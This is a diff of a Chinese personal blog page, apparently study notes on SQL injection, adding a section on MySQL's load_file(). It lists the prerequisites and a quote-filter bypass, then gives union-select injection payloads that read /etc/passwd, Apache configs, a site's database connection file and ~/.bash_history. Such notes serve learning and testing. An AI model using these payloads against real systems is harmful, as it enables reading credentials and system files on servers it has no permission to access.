@@ -54,7 +54,7 @@
 <meta property="og:site_name" content="NoObject&#39;s blog">
 <meta property="og:description" content="对表名为纯数字的表进行操作时，要在前后加上&#96;符号。 对列名进行更改时，要在后面指定修改后的数据类型   盲注时候多加一个^0或1是因为在盲注的时候可能出现了语法错误也无法判断,而改变这里的0或1,如果返回的结果是不同的,那就可以证明语法是没有问题的">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2020-03-17T09:21:03.758Z">
+<meta property="og:updated_time" content="2020-03-18T03:18:31.151Z">
 <meta name="twitter:card" content="summary">
 
 <link rel="canonical" href="http://yoursite.com/2020/03/17/SQL%E6%B3%A8%E5%85%A5/">
@@ -208,10 +208,16 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2020-03-17 17:14:01 / 修改时间：17:21:03" itemprop="dateCreated datePublished" datetime="2020-03-17T17:14:01+08:00">2020-03-17</time>
+              <time title="创建时间：2020-03-17 17:14:01" itemprop="dateCreated datePublished" datetime="2020-03-17T17:14:01+08:00">2020-03-17</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-03-18 11:18:31" itemprop="dateModified" datetime="2020-03-18T11:18:31+08:00">2020-03-18</time>
+              </span>
 
           
               <span>&emsp;</span><span class="post-meta-item-icon"><i class="fa fa-eye"></i></span>
@@ -233,7 +239,27 @@
 <li>对列名进行更改时，要在后面指定修改后的数据类型  </li>
 <li>盲注时候多加一个^0或1是因为在盲注的时候可能出现了语法错误也无法判断,而改变这里的0或1,如果返回的结果是不同的,那就可以证明语法是没有问题的</li>
 </ul>
-</blockquote>
+</blockquote><a id="more"></a>
+<h1 id="load-file-的使用"><a href="#load-file-的使用" class="headerlink" title="load_file()的使用"></a>load_file()的使用</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 要有file_priv权限</span><br><span class="line"><span class="number">2.</span> 知道文件绝对路径</span><br><span class="line"><span class="number">3.</span> 对web目录有读权限  </span><br><span class="line">注：若过滤了单引号，则可以将函数中的字符进行hex编码</span><br></pre></td></tr></table></figure>
+
+<h2 id="一般步骤"><a href="#一般步骤" class="headerlink" title="一般步骤"></a>一般步骤</h2><p>读/etc/init.d下的东西，这里有配置文件路径</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1'</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,load_file(<span class="string">'/etc/init.d/httpd'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>得到web安装路径</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1'</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,load_file(<span class="string">'/etc/apache/conf/httpd.conf'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>读取密码文件</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>' <span class="class"><span class="keyword">union</span> <span class="title">select</span></span> <span class="number">1</span>,<span class="number">2</span>,load_file(<span class="symbol">'var</span>/www/html/xxx.com/php/conn.inc.php')</span><br></pre></td></tr></table></figure>
+
+<p>  读取系统中所有的用户和用户的主要信息 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,2,load_file(&apos;/etc/passwd&apos;)</span><br></pre></td></tr></table></figure>
+
+<p>查看用户的history</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bash shell在“~/.bash_history”（“~/”表示用户目录）文件中保存了500条使用过的命令，这样能使你输入使用过的长命令变得容易。每个在系统中拥有账号的用户在他的目录下都有一个“.bash_history”文件。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,2,load_file(&apos;~/.bash_history&apos;)     （“~/”表示用户目录）</span><br></pre></td></tr></table></figure>
+
+
     </div>
 
     
@@ -304,6 +330,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#load-file-的使用"><span class="nav-number">1.</span> <span class="nav-text">load_file()的使用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#一般步骤"><span class="nav-number">1.1.</span> <span class="nav-text">一般步骤</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -370,7 +397,7 @@
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共4.1k字</span>
+  <span class="post-count">博客全站共6.9k字</span>
 </div>
 <br>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v4.0.0
